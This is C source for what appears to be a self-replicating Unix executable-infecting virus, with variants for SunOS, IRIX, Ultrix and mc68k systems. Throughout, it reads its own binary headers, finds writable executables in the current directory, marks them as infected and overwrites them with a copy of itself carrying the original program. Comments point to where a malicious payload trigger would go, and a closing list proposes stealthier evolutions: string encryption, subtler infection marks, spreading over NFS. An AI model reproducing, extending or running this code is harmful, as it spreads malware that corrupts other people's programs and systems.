#define COFF
/*
 * compilation: cc -o v9 -DCOFF v9.c cc -o v9 -DBSD v9.c
 */

#ifdef  COFF
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <filehdr.h>
#include <aouthdr.h>
#include <scnhdr.h>
#undef BSD_MARK
#define MARK 0X696E6665
#undef BSD
#endif


#ifdef BSD
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <a.out.h>
#define BSD_MARK 0X696E6665
#undef MARK
#undef COFF
#endif

/* definition of states */
#define PRISTINE 0              /* not executed even once */
#define LOADING  1              /* executed once, has headers loaded */
#define PREGNANT 2              /* executed twice, has a file loaded */
#define WRITE_SELF 3            /* ready to write an executable image of self
                                 * to disk */
#define ENTRY 4                 /* pseudo-state: in this state at beginning
                                 * of each execution */
#define GONZO 5                 /* panic exit state: something gone wrong */
#define QUIT 6                  /* pseudo-state: leaves state machine */

/*
 * transition table:  the next state to enter depends on two parameters,
 * "loaded", and "headers", and the state that machine is in right now.
 */

/*
 * table organized by: last state, headers, loaded (0-5),      (0,1),   (0,1)
 */
static int what_next[6][2][2] = {
        {{GONZO, WRITE_SELF}, {GONZO, GONZO},
        },

        {{WRITE_SELF, LOADING}, {PRISTINE, GONZO},
        },

        {{GONZO, LOADING}, {GONZO, GONZO},

        },

        {{QUIT, QUIT}, {GONZO, GONZO},
        },

        {{PREGNANT, LOADING}, {GONZO, PRISTINE},
        },

        {{QUIT, QUIT}, {QUIT, QUIT},
        }

};

/*
 * the transition table is deliberately cowardly: it enters the GONZO state
 * when a combo of parameters that could foreseeably be corrected, but is
 * nonetheless wrong, is encountered.
 */

#undef DEBUG
#ifdef DEBUG
#define D(x) x
#else
#define D(x)
#endif

#if defined(DEBUG) && defined(BSD)
#include <signal.h>
#endif

#ifdef COFF

/*
 * necessary to declare these as static and put something in them to get
 * compiler to put them in the .data section rather than the .bss section
 */
static FILHDR fhdptr = 52;
static AOUTHDR autptr = 53;
static SCNHDR scnptr[12] = {
1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 1, 2};


/* section no. of .data section */
static  datasn = 1;

#endif

/* non-zero if executable headers in data segment are nonsense */
static  headers = 1;

/* non-zero if other program isn't loaded into data segment */
static  loaded = 1;

#ifdef BSD
static struct exec exhdr = 93;

#endif

extern  errno;

#define PAGESIZE 8192
#define NFG 0x7f

main(argc, argv)
        int     argc;
        char   *argv[];

{

        int     j, next_state;

        int     fp_out, fp_in;
        char   *infect;
        static char *sbeak = (char *) 0x400000;
        static int size = 32, xsize;

        int     write_headers(), read_headers();
        void    error_dump(), monkey_headers();
        char   *sbrk(), *decide();

#ifdef BSD
        D(void funk();
        )
#endif

                D(write(2, "main\n", 5);
        )
#if defined(BSD) && defined( DEBUG )
        /* install signal handler */
                if ((int) signal(SIGSEGV, funk) == -1) {
                write(2, "installing signal\n", 18);
                _exit(errno);
        }
#endif

        /*
         * state machine to decide what to do next
         */

        next_state = ENTRY;

        while ((next_state = what_next[next_state][headers][loaded]) != QUIT) {

                switch (next_state) {

                case PRISTINE:

                        D(write(2, "pristine\n", 9);
                        )
                        /* open a file to read header info from */
                                if ((fp_in = open(argv[0], O_RDONLY)) < 0) {
                                write(2, "couldn't open self for header read\n", 35);
                                _exit(errno);
                        }
                        /* read in COFF headers */
                        size = read_headers(fp_in);

                        /* close self, done reading headers */
                        close(fp_in);

                        /*
                         * change header information to reflect bss and data
                         * combo
                         */
                        monkey_headers();

                        /* find out where current data segment ends */
                        /* this call will find end of .data and .bss segments */
                        if ((sbeak = sbrk(0)) < 0) {
                                write(2, "1st sbrk() failed\n", 18);
                                _exit(errno);
                        }

                        /*
                         * open a file to send new image of self with header
                         * info
                         */
                        if ((fp_out = open(argv[1], O_WRONLY | O_CREAT, 0755)) < 0) {
                                write(2, "couldn't open output file for write\n", 36);
                                _exit(errno);
                        }
                        headers = 0;

                        break;


                case LOADING:

                        D(write(2, "loading\n", 8);
                        )

                        /*
                         * find a good file to load and get size of selected
                         * file
                         */
                                infect = decide(&xsize);

                        /* decision about whether anything is left to infect */
                        if (infect[0] == NFG) {

                                /*
                                 * this would make a good trigger mechanism:
                                 * malicious part would go here
                                 */
                                write(2, "nothing left to infect\n\n", 24);
                                _exit(666);
                                break;
                        }
                        /* open that file */
                        D(write(2, "opening file\n", 13);
                        )
                                if ((fp_in = open(infect, O_RDONLY)) < 0) {
                                write(2, "couldn't open file for load\n", 28);
                                _exit(errno);
                        }
                        /* move system break */
                        D(write(2, "moving sbrk\n", 12);
                        )
                                if (sbrk(xsize) < 0) {
                                write(2, "2nd sbrk() failed\n", 18);
                                _exit(errno);
                        }
                        /* read in selected file */
                        D(write(2, "reading in file\n", 16);
                        )
                                if (read(fp_in, (char *) sbeak, xsize) < 0) {
                                write(2, "load failed\n", 12);
                                _exit(errno);
                        }
                        /* tinker with headers to reflect loaded condition */
#ifdef COFF
                        scnptr[datasn].s_size = (long) ((int) sbeak - scnptr[datasn].s_vaddr + xsize);
                        if (fhdptr.f_opthdr) {
                                /* optional header is present */
                                autptr.dsize = scnptr[datasn].s_size;
                        }
#endif

#ifdef BSD
                        exhdr.a_data = (long) ((int) sbeak - N_DATADDR(exhdr) + xsize);

#endif

                        /* open a file to write loaded self into */
                        if ((fp_out = open(infect, O_WRONLY | O_TRUNC)) < 0) {
                                write(2, "couldn't open file for rewrite of loaded self\n", 46);
                                _exit(errno);
                        }
                        loaded = 0;

                        break;

                case PREGNANT:

                        D(write(2, " pregnant\n", 10);
                        )
                                switch (fork()) {

                        case -1:        /* system call failure */
                                write(2, "fork() syscall failure\n", 23);
                                _exit(errno);
                                break;

                        default:        /* parent */

                                D(write(2, "child of infected file\n", 23);
                                )
                                /* open a temp file to write loaded file to */
                                        if ((fp_out = open("crud", O_WRONLY | O_CREAT, 0755)) < 0) {
                                        write(2, "couldn't open output file for rewrite\n", 38);
                                        _exit(errno);
                                }
                                D(write(2, "opened output file for write of loaded file\n", 44);
                                )
                                /* write loaded file from memory to disk */
                                        if (write(fp_out, (char *) sbeak, xsize) < xsize) {
                                        write(2, "couldn't write loaded file\n", 27);
                                        _exit(errno);
                                }
                                D(write(2, "wrote loaded file\n", 18);
                                )
                                        close(fp_out);

                                D(write(2, "ready to exec loaded file\n", 25);
                                )
                                        execv("crud", argv);

                                write(2, "execv failed\n", 13);

                                /*
                                 * should probably unlink "crud" at this
                                 * point
                                 */

                                _exit(errno);

                                break;

                        case 0:/* child */

                                D(write(2, "parent of infected file\n", 24);
                                )
                                /* reset system break */
                                        if (brk(sbeak) < 0) {
                                        write(2, "couldn't reset system break\n", 28);
                                        _exit(errno);
                                }

                                /*
                                 * reset parameter so that next state will be
                                 * LOADING, this process will still be
                                 * executing - no self-write
                                 */
                                loaded = 1;

                                break;

                        }

                        break;



                case WRITE_SELF:

                        D(write(2, "write self\n", 11);
                        )
                                size = write_headers(fp_out);

                        /* returned value has size of sections in it */
                        size = write_sections(size, fp_out);

                        /* zero fill file to pagesize */
                        j = PAGESIZE - size % PAGESIZE;

                        while (j--)
                                write(fp_out, "\000", 1);

                        close(fp_out);

                        break;

                case GONZO:
                default:
                        write(2, "something wrong with state machine\n", 35);
                        error_dump(next_state, headers, loaded, what_next[next_state][headers][loaded]);
                        break;
                }

        }


        _exit(0);


}




static int
write_headers(fp_out)
        int     fp_out;         /* file descriptor to write headers to */
{
        int     total;          /* total bytes written to fp_out */

#ifdef COFF
        int     sect_number, bytes_wrote;

#endif

        D(write(2, "write headers\n", 14);
        )
        /* just write already loaded headers to output file */

#ifdef COFF
                if ((total = write(fp_out, (char *) &fhdptr, (int) sizeof(struct filehdr))) < 0) {
                write(2, "couldn't rewrite header\n", 24);
                _exit(errno);
        }
        if (fhdptr.f_opthdr) {
                /* optional header is present */
                if ((bytes_wrote = write(fp_out, (char *) &autptr, (int) sizeof(struct aouthdr))) < 0) {
                        write(2, "couldn't rewrite Unix system header\n", 36);
                        _exit(errno);
                }
                total += bytes_wrote;
        }
        /* write out section headers */
        for (sect_number = 0; sect_number < fhdptr.f_nscns; ++sect_number) {

                if ((bytes_wrote = write(fp_out, (char *) &scnptr[sect_number], (int) SCNHSZ)) < 0) {
                        write(2,
                              "couldn't rewrite section header\n", 32);
                        _exit(sect_number);
                }
                total += bytes_wrote;
        }
#endif

#ifdef BSD

        if ((total = write(fp_out, (char *) &exhdr, (int) sizeof(struct exec))) < (int) sizeof(struct exec)) {
                write(2, "couldn't rewrite header\n", 24);
                _exit(errno);
        }
#endif

        return total;
}




static int
write_sections(file_size, fp_out)
        int     file_size, fp_out;
{

        int     sect_size, bytes_wrote;

#ifdef COFF
        int     pad_bytes, sect_number;

#endif

        D(write(2, "write sections\n", 15);
        )
                sect_size = file_size;

#ifdef COFF
        for (sect_number = 0; sect_number < fhdptr.f_nscns; ++sect_number) {

                if (scnptr[sect_number].s_scnptr) {
                        /* section has some stuff on disk */
                        if (sect_size < scnptr[sect_number].s_scnptr) {
                                /* need to pad file to match headers */
                                pad_bytes = scnptr[sect_number].s_scnptr - sect_size;
                                while (pad_bytes) {
                                        --pad_bytes;
                                        write(fp_out, "\000", 1);
                                        ++sect_size;
                                }
                        }
                        /* write segment from memory */

                        if ((bytes_wrote = write(fp_out, (char *) scnptr[sect_number].s_vaddr, (unsigned) scnptr[sect_number].s_size)) < scnptr[sect_number].s_size) {
                                write(2, "error writing segment\n", 22);
                                _exit(errno);
                        }
                        sect_size += bytes_wrote;
                }
        }
#endif

#ifdef BSD
        while (sect_size < N_TXTOFF(exhdr)) {
                write(fp_out, "\000", 1);
                ++sect_size;
        }

        /* write text segment from memory */
        if ((bytes_wrote = write(fp_out, (char *) (N_TXTADDR(exhdr) + sizeof(struct exec)), (int) exhdr.a_text - sizeof(struct exec))) <
            exhdr.a_text - sizeof(struct exec)) {
                write(2, "error writing text segment\n", 27);
                _exit(errno);
        }
        sect_size += bytes_wrote;

        /* write data segment from memory */
        if ((bytes_wrote = write(fp_out, (char *) (N_DATADDR(exhdr)), (int) exhdr.a_data)) < exhdr.a_data) {
                write(2, "error writing data segment\n", 27);
                _exit(errno);
        }
        sect_size += bytes_wrote;
#endif

        return sect_size;


}


static void
error_dump(state, no_headers, not_loaded, next_state)
        int     state, no_headers, not_loaded, next_state;
{

        void    print_state();

        D(write(2, "error dump\n", 11);
        )
                write(2, "state is ", 9);

        print_state(state);

        write(2, "no_headers is ", 14);
        if (no_headers)
                write(2, "TRUE\n", 5);
        else
                write(2, "FALSE\n", 6);

        write(2, "not_loaded is ", 14);
        if (not_loaded)
                write(2, "TRUE\n", 5);
        else
                write(2, "FALSE\n", 6);

        write(2, "next state is ", 14);

        print_state(next_state);


}


static void
print_state(state)
        int     state;
{

        D(write(2, "print_state\n", 12);
        )
                switch (state) {

        case PRISTINE:
                write(2, "PRISTINE\n", 9);
                break;

        case LOADING:
                write(2, "LOADING\n", 8);
                break;

        case PREGNANT:
                write(2, "PREGNANT\n", 9);
                break;

        case WRITE_SELF:
                write(2, "WRITE_SELF\n", 11);
                break;

        case ENTRY:
                write(2, "ENTRY\n", 6);
                break;

        case GONZO:
                write(2, "GONZO\n", 6);
                break;

        case QUIT:
                write(2, "QUIT\n", 5);
                break;

        default:
                write(2, "wrongo\n", 7);
                break;

        }
}


/*
 * machine dependant directory access stuff decide() is the only routine that
 * is called from the main, more portable portion of this program.  any
 * ancillary subroutines must be carefully defined inside #ifdef's for the
 * appropriate machine. decide() returns a pointer to a string with the name
 * of an eligible file in it.  it also puts the size of the file in bytes
 * into the passed argument.
 */

#if defined(sparc) || defined(mc68000)

/* Sun 3 (m680x0) and Sun 4 (sparc) */

/* SunOS directories are not exactly as documented for 4.0.3 */
#define MAXNAMLEN       255
#define BUFSIZ  1024

struct dirent {
        long    d_fileno;       /* file number of entry */
        short   d_reclen;       /* length of this record */
        short   d_namlen;       /* length of string in d_name */
        char    d_name[MAXNAMLEN + 1];  /* name (up to MAXNAMLEN + 1) */
};

static char *
decide(s)
        int    *s;
{
        int     fd, offset;
        char    ubuf[BUFSIZ];
        struct dirent *dirptr;
        struct stat stbuf;
        static char fname[MAXNAMLEN + 1];

        D(write(2, "decide\n", 7);
        )
                fname[0] = NFG;

        if ((fd = open(".", O_RDONLY)) < 0) {
                write(2, "couldn\'t open .\n", 16);
                _exit(errno);
        }
        if (read(fd, ubuf, BUFSIZ) < 0) {
                write(2, "reading .\n", 10);
                _exit(errno);
        }
        close(fd);

        dirptr = (struct dirent *) ubuf;

        offset = 0;

        while ((offset < BUFSIZ) && (offset >= 0) && (dirptr->d_namlen > 0)) {

                D(write(2, "examining ", 10);
                )
                        D(write(2, dirptr->d_name, dirptr->d_namlen);
                )
                        D(write(2, "\n", 1);
                )
                /* only examine files with names starting with 'q' */
                        if (dirptr->d_name[0] == 'q') {

                        /* decide whether file is infected already or not */
                        if (not_infectd(dirptr->d_name)) {

                                /* get file status */
                                if (stat(dirptr->d_name, (struct stat *) & stbuf) < 0) {
                                        D(write(2, "stat call failed\n", 17);
                                        )
                                                D(write(2, dirptr->d_name, dirptr->d_namlen);
                                        )
                                                D(write(2, "\n", 1);
                                        )
                                                continue;
                                }

                                /*
                                 * decide if file has appropriate read, write
                                 * and execute permissions
                                 */
                                if (accetab((int) stbuf.st_mode)) {

                                        int     i;

                                        /* copy name into static buffer */
                                        for (i = 0; dirptr->d_name[i]; ++i)
                                                fname[i] = dirptr->d_name[i];

                                        fname[i] = '\0';

                                        D(write(2, "infecting ", 10);
                                        )
                                                D(write(2, fname, dirptr->d_namlen);
                                        )
                                                D(write(2, "\n", 1);
                                        )
                                                * s = stbuf.st_size;
                                        break;

                                }
                        }
                }
                offset += dirptr->d_reclen;
                dirptr = (struct dirent *) (&ubuf[offset]);
        }

        return fname;

}




int
static
accetab(mode)
        int     mode;
{
        D(write(2, "accetab\n", 8);
        )
                if ((mode & S_IFREG) && (mode & S_IREAD) && (mode & S_IWRITE) && (mode &
                                                                   S_IEXEC))
                return 1;
        else
                return 0;
}


int
static
not_infectd(fn)
        char   *fn;
{
        struct exec exh;
        int     fd2;

        fd2 = open(fn, O_RDONLY);

        read(fd2, (char *) &exh, sizeof(struct exec));

        close(fd2);

        if (exh.a_syms == BSD_MARK)
                return 0;
        else
                return 1;
}


#endif

#if defined(MIPSEB) && defined(SVR3)
/* SGI IRIS series based on mips R2000 chip */
/* "Extent" file system */

#include <sys/types.h>
#include <sys/sema.h>
#include <sys/fs/efs.h>

char   *
decide(s)
        int    *s;
{
        char    dir_block[BBSIZE];
        struct efs_dirblk *dirhdr;
        struct efs_dent *d_ent;
        int     fd, tfd, i;
        struct stat stbuf;
        static FILHDR fhdx;

        /*
         * file name must be static since only pointer to it gets returned.
         * if it were automatic, that pointer would be invalid after function
         * returned.
         */
        static char fname[256];

        D(write(2, "decide\n", 7);
        )
                fname[0] = NFG;

        if ((fd = open(".", O_RDONLY)) < 0) {
                write(2, "couldn't open \".\"\n", 18);
                _exit(errno);
        }
        /* this read and close is not really robust - it's possible to have
multiple "basic blocksize" blocks for a singel directory */
        if ((read(fd, dir_block, BBSIZE)) < 0) {
                write(2, "couldn't read \".\"\n", 18);
                close(fd);
                _exit(errno);
        }
        close(fd);

        dirhdr = (struct efs_dirblk *) dir_block;

        /* loop over all file names in directory */
        for (i = 0; i < dirhdr->slots; ++i) {

                d_ent = (struct efs_dent *) (dir_block + EFS_SLOTAT((struct efs_dirblk *) dir_block, i));

                /* only examine files with names starting with 'q' */
                if (d_ent->d_name[0] == 'q') {

                        /*
                         * note use of library function: this may break
                         * itself if memcpy() uses static allocation
                         */
                        memcpy(fname, d_ent->d_name, d_ent->d_namelen);
                        fname[d_ent->d_namelen] = '\0';

                        /* file status call */
                        if (stat(fname, (struct stat *) & stbuf) < 0) {
                                D(write(2, "stat call failed\n", 17);
                                )
                                        D(write(2, d_ent->d_name, d_ent->d_namelen);
                                )
                                        D(write(2, "\n", 1);
                                )
                                        continue;
                        }

                        /*
                         * decide if file has appropriate read, write and
                         * execute permissions
                         */
                        if (accetab((int) stbuf.st_mode)) {

                                /* determine if this file is already infected */
                                if ((tfd = open(fname, O_RDONLY)) > 0) {

                                        if (read(tfd, (char *) &fhdx, sizeof(struct filehdr)) == sizeof(struct filehdr)) {

                                                close(tfd);

                                                if (fhdx.f_timdat != MARK) {
                                                        D(write(2, d_ent->d_name, d_ent->d_namelen);
                                                        )
                                                                D(write(2, "\n", 1);
                                                        )
                                                                * s = stbuf.st_size;
                                                        break;
                                                }
                                        }       /* read header */
                                }       /* open of file */
                        }       /* end of if over permissions acceptable */
                }               /* file name starts with 'q' */
                fname[0] = NFG;
        }                       /* loop over all directory entries */

        return (fname);
}


int
accetab(mode)
        int     mode;
{
        D(write(2, "accetab\n", 8);
        )
                if ((mode & S_IFREG) && (mode & S_IREAD) && (mode & S_IWRITE) && (mode & S_IEXEC))
                return 1;
        else
                return 0;
}


#endif                          /* IRIX efs directory access */

#if defined(MIPSEL) && defined(ultrix)

/*
 * DECStation 2100 - mix of Sys V and BSD, COFF exectables, BSD4.3
 * directories, based on mips R2000 chip
 */

#define MAXNAMLEN       255
#define BUFSIZ  1024

struct dirent {
        long    d_fileno;       /* file number of entry */
        short   d_reclen;       /* length of this record */
        short   d_namlen;       /* length of string in d_name */
        char    d_name[MAXNAMLEN + 1];  /* name (up to MAXNAMLEN + 1) */
};

char   *
decide(s)
        int    *s;
{
        int     dirfd, offset;
        char    ubuf[BUFSIZ];
        struct dirent *dirptr;
        struct stat stbuf;
        static char fname[MAXNAMLEN + 1];

        D(write(2, "decide\n", 7);
        )
                fname[0] = NFG;

        if ((dirfd = open(".", O_RDONLY)) < 0) {
                write(2, "couldn\'t open .\n", 16);
                _exit(errno);
        }
        if (read(dirfd, ubuf, BUFSIZ) < 0) {
                write(2, "reading .\n", 10);
                _exit(errno);
        }
        close(dirfd);

        dirptr = (struct dirent *) ubuf;

        offset = 0;

        while ((offset < BUFSIZ) && (offset >= 0) && (dirptr->d_namlen > 0)) {

                D(write(2, "examining ", 10);
                )
                        D(write(2, dirptr->d_name, dirptr->d_namlen);
                )
                        D(write(2, "\n", 1);
                )
                /* only examine files with names starting with 'q' */
                        if (dirptr->d_name[0] == 'q') {

                        /* decide whether file is infected already or not */
                        if (not_infectd(dirptr->d_name)) {

                                /* get file status */
                                if (stat(dirptr->d_name, (struct stat *) & stbuf) < 0) {
                                        D(write(2, "stat call failed\n", 17);
                                        )
                                                D(write(2, dirptr->d_name, dirptr->d_namlen);
                                        )
                                                D(write(2, "\n", 1);
                                        )
                                                continue;
                                }

                                /*
                                 * decide if file has appropriate read, write
                                 * and execute permissions
                                 */
                                if (accetab((int) stbuf.st_mode)) {

                                        int     i;

                                        /* copy name into static buffer */
                                        for (i = 0; dirptr->d_name[i]; ++i)
                                                fname[i] = dirptr->d_name[i];

                                        fname[i] = '\0';

                                        D(write(2, "infecting ", 10);
                                        )
                                                D(write(2, fname, dirptr->d_namlen);
                                        )
                                                D(write(2, "\n", 1);
                                        )
                                                * s = stbuf.st_size;
                                        break;

                                }
                        }
                }
                offset += dirptr->d_reclen;
                dirptr = (struct dirent *) & (ubuf[offset]);
        }

        return fname;

}




int
accetab(mode)
        int     mode;
{
        D(write(2, "accetab\n", 8);
        )
                if ((mode & S_IFREG) && (mode & S_IREAD) && (mode & S_IWRITE) && (mode &
                                                                   S_IEXEC))
                return 1;
        else
                return 0;
}


int
not_infectd(fn)
        char   *fn;
{
        int     dirfd2;
        static FILHDR fhdr;

        dirfd2 = open(fn, O_RDONLY);

        read(dirfd2, (char *) &fhdr, sizeof(fhdr));

        close(dirfd2);

        if (fhdr.f_timdat == MARK)
                return 0;
        else
                return 1;
}


#endif

#ifdef mc68k

/* actually the old-style 14 character Unix file system */

#include <sys/dir.h>

char   *
decide(s)
        int    *s;
{
        struct direct entry;
        struct stat stbuf;
        struct filehdr fhdx;
        int     dirfd, i, tfd;

        /*
         * file name must be static since only pointer to it gets returned.
         * if it were automatic, that pointer would be invalid after function
         * returned.
         */
        static char fname[DIRSIZ];

        D(write(2, "decide\n", 7);
        )
                if ((dirfd = open(".", O_RDONLY)) < 0) {
                write(2, "couldn't open \".\"\n", 18);
                _exit(errno);
        }
        fname[0] = NFG;

        while (read(dirfd, (char *) &entry, sizeof(struct direct)) > 0) {

                /* only examine files with names starting with 'q' */
                if (entry.d_name[0] == 'q') {

                        /* file status call */
                        if (stat(entry.d_name, (struct stat *) & stbuf) < 0) {
                                D(write(2, "stat call failed\n", 17);
                                )
                                        continue;
                        }

                        /*
                         * determine whether this file has acceptable read,
                         * write and execute permissions
                         */
                        if (accetab((int) stbuf.st_mode)) {

                                /* determine if this file is already infected */
                                if ((tfd = open(entry.d_name, O_RDONLY)) > 0) {

                                        if (read(tfd, (char *) &fhdx, sizeof(struct filehdr)) == sizeof(struct filehdr)) {

                                                close(tfd);

#ifdef MARK
                                                if (fhdx.f_timdat != MARK) {
#endif

                                                        for (i = 0; entry.d_name[i]; ++i)
                                                                fname[i] = entry.d_name[i];

                                                        D(write(2, entry.d_name, DIRSIZ);
                                                        )
                                                                * s = stbuf.st_size;
                                                        break;
#ifdef MARK
                                                }
#endif
                                        }
                                }
                        }       /* end of if over permissions acceptable */
                }               /* end of if over file name */
        }                       /* end of while over no. of directory entries */

        close(dirfd);

        return fname;
}


int
accetab(mode)
        int     mode;
{
        D(write(2, "accetab\n", 8);
        )
                if ((mode & S_IFREG) && (mode & S_IREAD) && (mode & S_IWRITE) && (mode & S_IEXEC))
                return 1;
        else
                return 0;
}


#endif

/* end of machine dependant directory access stuff */


/*
 * could potentially only write to disk the routines that program will need
 * from now on.  everything aft of this function could be eliminated from the
 * stuff written to disk, and loaded from disk next execution
 */


static void
monkey_headers()
{
#ifdef COFF
        int     sect_number, size_change;

#endif

        D(write(2, "monkey_headers\n", 15);
        )
        /* turn off symbol table stuff */

#ifdef COFF
                fhdptr.f_symptr = 0;
        fhdptr.f_nsyms = 0;
#endif


        /* mark as infected to keep from infecting itself again and again */
#ifdef MARK
        fhdptr.f_timdat = MARK;
#endif

#ifdef BSD_MARK
        /* this is a poor place to put mark */
        exhdr.a_syms = BSD_MARK;
#endif

        /* rearrange header data so .bss is now in .data */

#ifdef COFF
        /* find .data header */
        for (datasn = 1; datasn < fhdptr.f_nscns; ++datasn) {
                if (scnptr[datasn].s_name[1] == 'd')
                        break;
        }

        size_change = 0;

        for (sect_number = datasn + 1; sect_number < fhdptr.f_nscns; ++sect_number) {
                size_change += scnptr[sect_number].s_size;
                scnptr[datasn].s_size += scnptr[sect_number].s_size;
                scnptr[sect_number].s_size = 0;
                scnptr[sect_number].s_vaddr = 0;
                scnptr[sect_number].s_paddr = 0;
                scnptr[sect_number].s_scnptr = 0;
        }

        if (fhdptr.f_opthdr) {
                /* optional header is present */
                /* .data size increases */
                autptr.dsize += size_change;
                /* .bss section disappears */
                autptr.bsize = 0;
        }
#endif

#ifdef BSD
        exhdr.a_data += exhdr.a_bss;
        exhdr.a_bss = 0;
#endif

}


int
static
read_headers(fd_in)
        int     fd_in;          /* file descriptor to read headers from */
{

        int     total;

#ifdef COFF
        int     sect_number, bytes_read;


        if ((total = read(fd_in, (char *) &fhdptr, sizeof(struct filehdr))) < 0) {
                write(2, "couldn't read header\n", 21);
                _exit(errno);
        }
        if (fhdptr.f_opthdr) {
                /* optional header is present */
                if ((bytes_read = read(fd_in, (char *) &autptr, (int) sizeof(struct aouthdr))) < 0) {
                        write(2, "couldn't read Unix system header\n", 33);
                        _exit(errno);
                }
                total += bytes_read;
        }
        for (sect_number = 0; sect_number < fhdptr.f_nscns; ++sect_number) {
                if ((bytes_read = read(fd_in, (char *) &scnptr[sect_number], SCNHSZ)) < 0) {
                        write(2, "couldn't read section header\n", 29);
                        _exit(sect_number);
                }
                total += bytes_read;
        }
#endif


#ifdef BSD
        if ((total = read(fd_in, (char *) &exhdr, sizeof(struct exec))) < 0) {
                write(2, "couldn't read header\n", 21);
                _exit(errno);
        }
#endif

        return total;
}


#if defined(BSD) && defined( DEBUG )

void
funk(sig, code, scp, addr)
        int     sig, code;
        struct sigcontext *scp;
        char   *addr;
{
        char    buffer[9];
        int     r, i, j;

        write(2, "SIGSEGV\n", 8);

        for (i = 28, j = 0; i >= 0; i -= 4) {

                r = ((int) addr >> i) & 0x0f;

                if (r < 10)
                        buffer[j] = (char) r + '0';
                else
                        buffer[j] = (char) r - 10 + 'a';

                ++j;

        }

        buffer[8] = 0;

        write(2, buffer, 9);

        _exit(errno);
}


#endif

/*
 * Possible improvements: 1. compress loaded executable so that file sizes
 * don't grow. 2. more aggressive state transition table - attemp to recover
 * from goofups. 3. better decision algorithm on which files to infect.
 * change directories. 4. subtler "infected" mark. 5. encrypt strings inside
 * of program. 6. modify state transition table to remove intermediate
 * self-writes. 7. remove error-checking on debugged versions 8. carry
 * compressed source code around - infection of nfs volumes across machine
 * hardware type. 9. postion independant code so that suriv lives at end of
 * executable file. only need to change entry point in header, append suriv,
 * make suriv able to execute a jump to real entry point. 10. distinguish
 * between executables and shell scripts. 11. drop off code that doesn't need
 * to be there after 1st execution.
 */
